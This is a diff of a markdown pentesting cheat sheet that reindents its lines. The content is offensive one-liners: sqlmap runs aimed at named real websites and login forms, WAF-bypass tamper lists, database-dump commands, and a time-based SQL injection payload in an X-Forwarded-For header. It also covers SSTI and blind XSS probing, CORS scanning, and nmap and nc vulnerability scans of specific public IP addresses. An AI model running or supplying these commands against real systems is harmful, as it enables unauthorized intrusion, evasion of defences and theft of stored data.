@@ -106,59 +106,73 @@
 
 ## Sql Injection :-
 
-echo https://www.recreation.gov | waybackurls | grep "\?" | uro | httpx -silent > param.txt
+     echo https://www.recreation.gov | waybackurls | grep "\?" | uro | httpx -silent > param.txt
+-
 
-cat subdomains.txt | waybackurls | grep "\?" | uro | httpx -silent > param.txt
+     cat subdomains.txt | waybackurls | grep "\?" | uro | httpx -silent > param.txt
+-
 
-sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
+     sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
+-
 
-nuclei -list subdomains_alive.txt -t /Priv8-Nuclei/cors
+     nuclei -list subdomains_alive.txt -t /Priv8-Nuclei/cors
+-
 
-nuclei  -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech
+     nuclei  -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech
+-
 
-sqlmap -u https://my.easyname.at/en/login --dbs --forms --crawl=2
+     sqlmap -u https://my.easyname.at/en/login --dbs --forms --crawl=2
+-
 
-cat allurls.txt | gf lfi | nuclei -tags lfi
-cat allurls.txt | gf redirect | openredirex -p /openRedirect
+     cat allurls.txt | gf lfi | nuclei -tags lfi
+-
+
+     cat allurls.txt | gf redirect | openredirex -p /openRedirect
+
 
 # Waf Bypass techniques Using Sqlmap :-
 
---dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump
+     --dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump
+-
 
+     --tamper=space2comment --level=5 --risk=3
+-
 
---tamper=space2comment --level=5 --risk=3
+     --technique=B
+-
 
+     --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
+-
 
---technique=B
+     --random-agent --dbms=MYSQL --dbs --technique=B
+-
 
+     -v3 --technique=T --no-cast --fresh-queries --banner
+-
 
---level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
-
-
---random-agent --dbms=MYSQL --dbs --technique=B
-
--v3 --technique=T --no-cast --fresh-queries --banner
-
-
-tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+     tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
 
 
 ## SQLi One Linear :-
 
-cat target.com | waybackurls | grep "\?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+     cat target.com | waybackurls | grep "\?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+-
 
-subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+     subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
 
 
 ## Dump-Data :-
 
-sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dbs  (Databases)
+     sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dbs  (Databases)
+-
 
-sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --tables -D acuart (Dump DB tables )
+     sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --tables -D acuart (Dump DB tables )
+-
 
-sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --columns -T users (Dump Table Columns )
+     sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --columns -T users (Dump Table Columns )
+-
 
-sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dump -D acuart -T users
+     sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dump -D acuart -T users
 
 __________________________________________________________________________________________________
 
@@ -167,15 +181,17 @@ ________________________________________________________________________________
 
 FOR Testing SSTI and tplmap tool :-
 
-git clone https://github.com/epinna/tplmap.git
+     git clone https://github.com/epinna/tplmap.git
+-
 
-./tplmap.py -u "domain.com/?parameter=SSTI*"
+     ./tplmap.py -u "domain.com/?parameter=SSTI*"
 
 __________________________________________________________________________________________________
 
-httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php
+     httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php
+-
 
-httpx -l live_subs.txt --status-code --title -mc 200 -path /composer.json
+     httpx -l live_subs.txt --status-code --title -mc 200 -path /composer.json
 
 __________________________________________________________________________________________________
 
@@ -184,11 +200,13 @@ ________________________________________________________________________________
 ######## Testing for xss and sqli at the same time >_< ##############
 
 
-cat subdomains.txt | waybackurls | uro | grep "\?" | httpx -silent > param.txt
+     cat subdomains.txt | waybackurls | uro | grep "\?" | httpx -silent > param.txt
+-
 
-sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
+     sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
+-
 
-cat param.txt | kxss   
+     cat param.txt | kxss   
 
 __________________________________________________________________________________________________
 
@@ -200,7 +218,7 @@ Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
 
 ## Blind XSS :-
 
-site:opsgenie.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" | inurl:"contact-form"
+     site:opsgenie.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" | inurl:"contact-form"
 
 ## Go to xss.report website and create an account to test for blind xss Vulnerbilitites 
 __________________________________________________________________________________________________
@@ -209,58 +227,73 @@ ________________________________________________________________________________
 ## Hunting For Cors Misconfigration :-
 
 
-https://github.com/chenjj/CORScanner
+     https://github.com/chenjj/CORScanner
+-
 
-pip install corscanner
+     pip install corscanner
+-
 
-corscanner -i live_subdomains.txt -v -t 100
+     corscanner -i live_subdomains.txt -v -t 100
 
 ________________________________________________________________________________________________
 
 https://github.com/Tanmay-N/CORS-Scanner
 
-go install github.com/Tanmay-N/CORS-Scanner@latest
+     go install github.com/Tanmay-N/CORS-Scanner@latest
+-
 
-cat CORS-domain.txt | CORS-Scanner
+     cat CORS-domain.txt | CORS-Scanner
 
 ________________________________________________________________________________________________
 
 ## Nmap Scanning :-
 
-nmap -sS -p- 192.168.1.4  (-sS) Avoid Firewell && Connection Log.
+     nmap -sS -p- 192.168.1.4  (-sS) Avoid Firewell && Connection Log.
+-
 
-nmap -sS -p- -iL hosts.txt 
+     nmap -sS -p- -iL hosts.txt 
+-
 
-nmap -Pn -sS -A -sV -sC -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -iL liveips.txt -oN scan-result.txt
+     nmap -Pn -sS -A -sV -sC -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -iL liveips.txt -oN scan-result.txt
+-
 
+     nmap -Pn -A -sV -sC 67.20.129.216 -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -oN scan-result.txt --script=vuln
+-
 
-nmap -Pn -A -sV -sC 67.20.129.216 -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -oN scan-result.txt --script=vuln
+     nmap -sT -p- 192.168.1.4    (Full Scan (TCP)).
+-
 
-nmap -sT -p- 192.168.1.4    (Full Scan (TCP)).
+     nmap -sT -p- 192.168.1.5 --script=banner (Services Fingerprinting).
+-
 
-nmap -sT -p- 192.168.1.5 --script=banner (Services Fingerprinting).
+     nmap -sV 192.168.1.4 (Services Fingerprinting).
+-
 
-nmap -sV 192.168.1.4 (Services Fingerprinting).
+     nmap 192.168.1.5 -O   (OS Fingerprinting).
+-
 
-nmap 192.168.1.5 -O   (OS Fingerprinting).
+     nmap 192.168.1.0-255 -sn  (-sn) Live Hosts with me in network.
+-
 
-nmap 192.168.1.0-255 -sn  (-sn) Live Hosts with me in network.
+     nmap -iL hosts.txt -sn
+-
 
-nmap -iL hosts.txt -sn
+     nc -nvz 192.168.1.4 1-65535  (Port Scanning Using nc).
+-
 
+     nc -vn 34.66.209.2 22        (Services Fingerprinting).
+-
 
-nc -nvz 192.168.1.4 1-65535  (Port Scanning Using nc).
+     netdiscover     (Devices On Network) (Layer2).
+-
 
-nc -vn 34.66.209.2 22        (Services Fingerprinting).
+     netdiscover -r 192.168.2.0/24  (Range).
+-
 
+     netdiscover -p        (Passive)
+-
 
-netdiscover     (Devices On Network) (Layer2).
-
-netdiscover -r 192.168.2.0/24  (Range).
-
-netdiscover -p        (Passive).
-
-netdiscover -l hosts.txt
+     netdiscover -l hosts.txt
 __________________________________________________________________________________________________
 
 
